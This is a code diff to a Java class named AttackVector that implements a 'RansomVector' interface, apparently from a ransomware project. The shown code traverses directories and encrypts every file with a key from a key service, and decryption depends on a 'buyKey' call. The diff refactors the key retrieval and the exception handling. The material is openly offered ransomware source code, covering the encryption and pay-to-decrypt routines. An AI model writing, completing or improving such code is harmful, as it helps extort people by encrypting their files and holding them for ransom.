@@ -11,6 +11,11 @@ import Agent.cryptFile.DecryptFile;
 import Agent.cryptFile.EncryptFile;
 import Agent.entites.AlgorithmsMap;
 import Agent.entites.CryptoKey;
+import Agent.exceptions.AlgorithmNotFoundException;
+import Agent.exceptions.CryptoException;
+import Agent.exceptions.InOutException;
+import Agent.exceptions.KeyNotFoundException;
+import Agent.exceptions.PaddingException;
 import Agent.exceptions.RansomwareException;
 import Agent.services.KeyService;
 import Agent.traversal.*;
@@ -22,7 +27,7 @@ public class AttackVector implements RansomVector {
 	@Override
 	public void encryptFileSystem() throws RansomwareException {
 		try {
-			cryptFileSystem(keyService.getKey("GET"), new EncryptFile());
+			cryptFileSystem(keyService.getKey(), new EncryptFile());
 		} catch (RansomwareException e) {
 			throw new RansomwareException("Encrypting the file-system failed", e.getCause());
 		}
@@ -33,7 +38,7 @@ public class AttackVector implements RansomVector {
 	public void decryptFileSystem() throws RansomwareException {
 		try {
 
-			cryptFileSystem(keyService.getKey("BUY"), new DecryptFile());
+			cryptFileSystem(keyService.buyKey(), new DecryptFile());
 		} catch (RansomwareException e) {
 			throw new RansomwareException("Decrypting the file-system failed", e.getCause());
 		}
@@ -67,7 +72,8 @@ public class AttackVector implements RansomVector {
 	}
 
 	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
-			CryptoOperation cryptoFunc) throws RansomwareException {
+			CryptoOperation cryptoFunc)
+			throws AlgorithmNotFoundException, PaddingException, KeyNotFoundException, CryptoException, InOutException {
 
 		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
 
@@ -88,10 +94,19 @@ public class AttackVector implements RansomVector {
 						}
 
 					} else if (file.isFile()) {
+
 						try {
 							cryptoFunc.operate(key, file, crypto);
-						} catch (RansomwareException e) {
-							throw new RansomwareException("crypt opertation failed", e.getCause());
+						} catch (AlgorithmNotFoundException e) {
+							throw new AlgorithmNotFoundException("algorithm class not found", e.getCause());
+						} catch (PaddingException e) {
+							throw new PaddingException("padding went wrong", e.getCause());
+						} catch (KeyNotFoundException e) {
+							throw new KeyNotFoundException("key not found", e.getCause());
+						} catch (CryptoException e) {
+							throw new CryptoException("Problem crypting file", e.getCause());
+						} catch (InOutException e) {
+							throw new InOutException("You dont have enough premission to do this", e.getCause());
 						}
 
 					}
